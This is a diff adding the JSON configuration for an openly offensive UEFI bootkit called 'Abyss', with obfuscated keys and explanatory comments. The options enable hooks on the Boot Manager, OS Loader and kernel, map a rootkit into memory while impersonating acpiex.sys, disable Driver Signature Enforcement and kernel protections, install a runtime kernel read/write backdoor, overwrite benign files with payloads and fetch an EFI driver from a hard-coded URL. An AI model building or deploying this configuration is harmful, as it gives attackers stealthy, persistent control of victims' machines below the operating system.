@@ -1,0 +1,79 @@
+{
+	"_comment_Screen": "Do you want to display something on the screen? The screen will be resized automatically to ensure the content is clearly visible.",
+	"R6>Z6": "TRUE",
+
+
+
+
+
+	"_comment_Banner": "Cool Bootkit Banners (Only one should be set to TRUE)",
+	"ZMF3_|hzXF$oIWb#": "TRUE",
+
+	"_comment_BannerImageAbyssSquid": "Abyss Oficial Logo -> Abyss\\AbyssBootkitPkg\\Bootkit1_Boot_UEFIApplication\\PayloadsRaw\\Images\\Abyss_Squid_Resize.png",
+	"N|YR+rvUxCoRz,AZSPXFm4YY": "TRUE",
+
+	"_comment_BannerImageSquid": "Squid Logo -> Abyss\\AbyssBootkitPkg\\Bootkit1_Boot_UEFIApplication\\PayloadsRaw\\Images\\Squid_Resize.png",
+	"kVHh+m?1voGl7H|feBhfLa_q": "FALSE",
+
+	"_comment_BannerAscii": "Image to Ascii -> https://www.asciiart.eu/image-to-ascii",
+	"kDd7GqxPhu": "FALSE",
+
+
+
+
+
+	"_comment_UEFIReadWriteNTFSDriver": "Would you like to load a driver that enables read and write access to NTFS partitions during UEFI execution? This allows for interacting with NTFS file systems before the OS starts, enabling pre-boot file modifications",
+	"-vsFur@RfVs,qNA3yO": "FALSE",
+
+	"_comment_UEFIReadWriteNTFSDriverDownload": "Download the NTFS EFI driver from a remote URL instead of shipping it with the bootkit binary?",
+	"yDjELm-@gc7IJ+DxWLjF": "FALSE",
+
+	"_comment_UEFIReadWriteNTFSDriverURL": "Absolute HTTP/HTTPS URL pointing to the EFI driver binary",
+	"1LWkQjINkB1+r": ["http://192.168.1.75:8080/ntfs.efi"],
+
+	"_comment_UEFIReadWriteNTFSDriverPath": "https://github.com/pbatard/ntfs-3g",
+	"j|vQ;xIj:-TIU_-": "\\EFI\\Boot\\ntfs.efi",
+
+
+
+
+
+	"_comment_AdditionalComponent": "Would you like the Bootkit (UEFI Application) to deploy an additional binary component to disk that may be used later during OS boot or by a secondary agent? This mechanism is primarily used to overwrite existing benign files. However, it can also be leveraged to deploy custom payloads to disk, provided the target file already exists. Writing to NTFS partitions requires that the NTFS read/write driver has been loaded beforehand.",
+	"R3cVEz": "FALSE",
+
+	"_comment_AdditionalComponentPath": "Relative path (within NTFS partitions) to the file that will be overwritten with the staged component (e.g., a driver [driverquery /FO LIST /v] or system binary).",
+	"$SHoiHiFDk@Z#;9c!j": "\\Users\\TheMalwareGuardian\\Downloads\\Tool.exe",
+
+
+
+
+
+	"_comment_BootkitRuntime": "Would you like to load a Runtime Bootkit (DXE Runtime Driver) that hooks UEFI Runtime Services after the system has booted? This persistent backdoor allows unrestricted kernel memory read/write operations, enabling you to disable protections, inject code, or load additional Rootkits directly into memory at runtime.",
+	"CZ!cui+lQ": "FALSE",
+
+	"_comment_BootkitRuntimePath": "Absolute path (on the ESP) to the pre-existing Runtime Bootkit binary (DXE Runtime Driver). This file must be manually copied to the ESP beforehand, just like the main Bootkit application.",
+	"FJS40qGdLp:": "\\EFI\\Boot\\AbyssBootkit2DXERuntimeDriver.efi",
+
+
+
+
+
+	"_comment_BootkitBoot": "Would you like the Bootkit (UEFI Application) to function as a real UEFI Bootkit by hooking critical functions in the Boot Manager, OS Loader, and Kernel to maintain control from the boot process to user interaction? This option should be enabled by default to ensure full Bootkit functionality.",
+	"tNFrYNQTnfvyd:0&w!lM!MF_Fxab": "TRUE",
+
+	"_comment_BootkitBootMapRootkitToMemory": "Do you want the Bootkit (UEFI Application) to map the Rootkit (Kernel Mode Driver) directly into memory during the boot process?",
+	"NicEQuQmEi2l;>Am?jJm-+460": "TRUE",
+
+	"_comment_BootkitBootMapRootkitToMemoryModule": "Specify the name of a legitimate module that will be impersonated by the Rootkit. The Bootkit will map the Rootkit into memory and replace the target module's EntryPoint with its own, effectively hijacking execution.",
+	"rNk|yF": "acpiex.sys",
+
+
+
+
+
+	"_comment_DisableProtections": "Do you want to disable common kernel-mode protections to allow unrestricted kernel tampering?",
+	"eFlWP|Rp>pZB.U:f": "TRUE",
+
+	"_comment_DisableProtectionsDSE": "Would you like to disable Driver Signature Enforcement (DSE) to allow unsigned drivers to load after boot?",
+	"d4RYHko<?n+-jA72Q#<jp:": "TRUE"
+}
